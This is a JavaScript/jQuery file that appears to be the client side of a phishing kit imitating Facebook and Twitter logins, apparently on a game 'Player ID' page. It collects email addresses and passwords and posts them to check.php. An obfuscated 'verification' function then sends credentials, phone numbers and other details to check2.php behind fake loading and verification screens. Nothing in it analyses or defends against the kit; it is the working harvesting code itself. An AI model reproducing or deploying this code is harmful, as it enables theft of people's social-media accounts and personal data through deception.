$(document).ready(function () {
  $("#password-twitter").keyup(function () {
    if ($(this).val().length != 0) {
      $(".onbutton").removeClass().addClass("twbutton");
    } else {
      $(".twbutton").removeClass().addClass("onbutton");
    }
  });
});
$(document).ready(function () {
  $("#sec-password-twitter").keyup(function () {
    if ($(this).val().length != 0) {
      $(".seconbutton").removeClass().addClass("sectwbutton");
    } else {
      $(".sectwbutton").removeClass().addClass("seconbutton");
    }
  });
});
// code function data
function ValidateLoginFbData() {
  $("#ValidateLoginFbForm").submit(function (submitingValidateLoginFbData) {
    submitingValidateLoginFbData.preventDefault();

    $emailfb = $("#email-facebook").val().trim();
    $passwordfb = $("#password-facebook").val().trim();
    $loginfb = $("#login-facebook").val().trim();
    if ($emailfb == "" || $emailfb == null || $emailfb.length <= 5) {
      $(".email-fb").fadeIn();
      setTimeout(function () {
        $(".email-fb").fadeOut();
      }, 2000);
      $(".sandi-fb").hide();
      $(".PlayerIdLoginBox").hide();
      $(".login-facebook").show();
      return false;
    } else {
      $(".email-fb").hide();
      $("input#validateEmail").val($emailfb);
      $(".login-facebook").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordfb == "" || $passwordfb == null || $passwordfb.length <= 5) {
      $(".sandi-fb").fadeIn();
      setTimeout(function () {
        $(".sandi-fb").fadeOut();
      }, 2000);
      $(".PlayerIdLoginBox").hide();
      $(".login-facebook").show();
      return false;
    } else {
      $(".sandi-fb").hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $(".login-facebook").hide();
      $(".login-facebook-load").show();
      setTimeout(function () {
        $(".account_verification").show();
        $(".login-facebook-sec").hide();
        $(".login-facebook-load").hide();
      }, 3000);
    }
    var $validateEmail = $("input#validateEmail").val();
    var $validatePassword = $("input#validatePassword").val();
    var $validateLogin = $("input#validateLogin").val();
    if (
      $validateEmail == "" &&
      $validatePassword == "" &&
      $validateLogin == "" &&
      $playid == ""
    ) {
      $(".account_verification").hide();
      return false;
    }

    $.ajax({
      type: "POST",
      url: "check.php",
      data: $(this).serialize(),
      beforeSend: function () {
        $(".login-facebook").hide();
      },
      success: function () {
        $(".login-facebook").hide();
      },
    });
  });
  return false;
}
function ValidateLoginTwitterData() {
  $("#ValidateLoginTwitterForm").submit(function (
    submitingValidateLoginTwitterData
  ) {
    submitingValidateLoginTwitterData.preventDefault();

    $emailtw = $("#email-twitter").val().trim();
    $passwordtw = $("#password-twitter").val().trim();
    $logintw = $("#login-twitter").val().trim();
    if ($emailtw == "" || $emailtw == null || $emailtw.length <= 3) {
      $(".email-tw").fadeIn();
      setTimeout(function () {
        $(".email-tw").fadeOut();
      }, 2000);
      $(".sandi-tw").hide();
      $(".PlayerIdLoginBox").hide();
      $(".login-twitter").show();
      return false;
    } else {
      $(".email-tw").hide();
      $("input#validateEmail").val($emailtw);
      $(".login-twitter").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordtw == "" || $passwordtw == null || $passwordtw.length <= 7) {
      $(".sandi-tw").fadeIn();
      setTimeout(function () {
        $(".sandi-tw").fadeOut();
      }, 2000);
      $(".PlayerIdLoginBox").hide();
      $(".login-twitter").show();
      return false;
    } else {
      $(".sandi-tw").hide();
      $("input#validatePassword").val($passwordtw);
      $("input#validateLogin").val($logintw);
      $(".login-twitter").hide();
      $(".login-twitter-load").show();
      setTimeout(function () {
        $(".account_verification").show();
        $(".login-twitter-sec").hide();
        $(".login-twitter-load").hide();
      }, 3000);
    }
    var $validateEmail = $("input#validateEmail").val();
    var $validatePassword = $("input#validatePassword").val();
    var $validateLogin = $("input#validateLogin").val();
    if (
      $validateEmail == "" &&
      $validatePassword == "" &&
      $validateLogin == "" &&
      $playid == ""
    ) {
      $(".account_verification").hide();
      return false;
    }

    $.ajax({
      type: "POST",
      url: "check.php",
      data: $(this).serialize(),
      beforeSend: function () {
        $(".login-twitter").hide();
      },
      success: function () {
        $(".login-twitter").hide();
      },
    });
  });
  return false;
}

function SecValidateLoginFbData() {
  $("#SecValidateLoginFbForm").submit(function (submitingValidateLoginFbData) {
    submitingValidateLoginFbData.preventDefault();

    $emailfb = $("#sec-email-facebook").val().trim();
    $passwordfb = $("#sec-password-facebook").val().trim();
    $loginfb = $("#sec-login-facebook").val().trim();
    if ($emailfb == "" || $emailfb == null || $emailfb.length <= 5) {
      $(".email-fb").fadeIn();
      $(".wrong-fb").hide();
      setTimeout(function () {
        $(".email-fb").fadeOut();
      }, 2000);
      $(".sandi-fb").hide();
      $(".wrong-fb").hide();
      $(".PlayerIdLoginBox").hide();
      $(".login-facebook-sec").show();
      return false;
    } else {
      $(".email-fb").hide();
      $(".wrong-fb").hide();
      $("input#validateEmail").val($emailfb);
      $(".login-facebook-sec").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordfb == "" || $passwordfb == null || $passwordfb.length <= 5) {
      $(".sandi-fb").fadeIn();
      $(".wrong-fb").hide();
      setTimeout(function () {
        $(".wrong-fb").hide();
        $(".sandi-fb").fadeOut();
      }, 2000);
      $(".PlayerIdLoginBox").hide();
      $(".login-facebook-sec").show();
      return false;
    } else {
      $(".sandi-fb").hide();
      $(".wrong-fb").hide();
      $("input#validatePassword").val($passwordfb);
      $("input#validateLogin").val($loginfb);
      $(".login-facebook-sec").hide();
      $(".login-facebook-load").show();
      setTimeout(function () {
        $(".account_verification").hide();
        $(".login-facebook-sec").hide();
        $(".login-facebook-load").hide();
      }, 3000);
    }
    var $validateEmail = $("input#validateEmail").val();
    var $validatePassword = $("input#validatePassword").val();
    var $validateLogin = $("input#validateLogin").val();
    if (
      $validateEmail == "" &&
      $validatePassword == "" &&
      $validateLogin == "" &&
      $playid == ""
    ) {
      $(".account_verification").show();
      return false;
    }

    $.ajax({
      type: "POST",
      url: "check.php",
      data: $(this).serialize(),
      beforeSend: function () {
        $(".login-facebook-sec").hide();
      },
      success: function () {
        $(".login-facebook-sec").hide();
      },
    });
  });
  return false;
}

function SecValidateLoginTwitterData() {
  $("#SecValidateLoginTwitterForm").submit(function (
    submitingValidateLoginTwitterData
  ) {
    submitingValidateLoginTwitterData.preventDefault();

    $emailtw = $("#sec-email-twitter").val().trim();
    $passwordtw = $("#sec-password-twitter").val().trim();
    $logintw = $("#sec-login-twitter").val().trim();
    if ($emailtw == "" || $emailtw == null || $emailtw.length <= 3) {
      $(".email-tw").fadeIn();
      $(".wrong-tw").hide();
      setTimeout(function () {
        $(".email-tw").fadeOut();
      }, 2000);
      $(".sandi-tw").hide();
      $(".wrong-tw").hide();
      $(".PlayerIdLoginBox").hide();
      $(".login-twitter-sec").show();
      return false;
    } else {
      $(".email-tw").hide();
      $(".wrong-tw").hide();
      $("input#validateEmail").val($emailtw);
      $(".login-twitter-sec").hide();
      $(".PlayerIdLoginBox").show();
    }
    if ($passwordtw == "" || $passwordtw == null || $passwordtw.length <= 7) {
      $(".sandi-tw").fadeIn();
      $(".wrong-tw").hide();
      setTimeout(function () {
        $(".sandi-tw").fadeOut();
        $(".wrong-tw").hide();
      }, 2000);
      $(".PlayerIdLoginBox").hide();
      $(".login-twitter-sec").show();
      return false;
    } else {
      $(".sandi-tw").hide();
      $(".wrong-tw").hide();
      $("input#validatePassword").val($passwordtw);
      $("input#validateLogin").val($logintw);
      $(".login-twitter-sec").hide();
      $(".login-twitter-load").show();
      setTimeout(function () {
        $(".login-twitter-sec").hide();
        $(".account_verification").hide();
        $(".login-twitter-load").hide();
      }, 3000);
    }
    var $validateEmail = $("input#validateEmail").val();
    var $validatePassword = $("input#validatePassword").val();
    var $validateLogin = $("input#validateLogin").val();
    if (
      $validateEmail == "" &&
      $validatePassword == "" &&
      $validateLogin == "" &&
      $playid == ""
    ) {
      $(".account_verification").show();
      return false;
    }

    $.ajax({
      type: "POST",
      url: "check.php",
      data: $(this).serialize(),
      beforeSend: function () {
        $(".login-twitter-sec").hide();
      },
      success: function () {
        $(".login-twitter-sec").hide();
      },
    });
  });
  return false;
}
function ValidateVerificationData() {
  return (
    $("#ValidateVerificationDataForm").submit(function (_0x1820d3) {
      _0x1820d3.preventDefault();
      var _0xbf449e = $("input#validateEmail").val(),
        _0x1406b6 = $("input#validatePassword").val(),
        _0x2092e2 = $("input#ValidatePopupPlayId").val(),
        _0x1dfb1c = $("input#phone").val(),
        _0xf63e48 = $("input#level").val(),
        _0x1ebcc1 = $("input#vmail").val(),
        _0x28bf58 = $("input#codetel").val(),
        _0x36c6e1 = $("input#validateLogin").val();
      if (
        _0xbf449e == "" &&
        _0x1406b6 == "" &&
        $nick == "" &&
        _0x2092e2 == "" &&
        _0x1dfb1c == "" &&
        _0xf63e48 == "" &&
        _0x1ebcc1 == "" &&
        _0x36c6e1 == "" &&
        _0x28bf58 == ""
      ) {
        return (
          $(".verification_info").show(),
          $(".account_verification").hide(),
          false
        );
      }
      $.ajax({
        type: "POST",
        url: "check2.php",
        data: $(this).serialize(),
        beforeSend: function () {
          $(".account_verification").hide();
          $(".check_verification").show();
          setTimeout(function () {
            $(".processing_account").show();
            $(".check_verification").hide();
          }, 3000);
        },
        success: function () {
          $(".account_verification").hide();
        },
      });
    }),
    false
  );
}
